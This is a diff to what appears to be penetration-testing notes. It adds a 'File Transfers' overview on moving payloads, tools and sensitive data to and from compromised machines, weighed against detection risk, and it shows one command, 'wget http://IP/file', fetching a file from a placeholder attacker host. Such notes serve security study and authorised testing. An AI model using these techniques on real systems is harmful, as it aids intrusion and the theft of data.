@@ -1,4 +1,10 @@
+# File Transfers
 
+## Overview
+
+During post-exploitation and lateral movement, it is important to identify reliable methods for transferring files between attacker and target systems. File transfer techniques are often required to upload payloads, download sensitive data, or move tools onto compromised machines where standard download utilities may not be available. Depending on the environment, methods may include HTTP, FTP, SMB, SCP, base64 encoding, or built-in system utilities such as curl, wget, certutil, and PowerShell. The chosen technique should depend on network restrictions, available binaries, and detection risk.
+
+---
 Linux
 ```
 wget http://IP/file
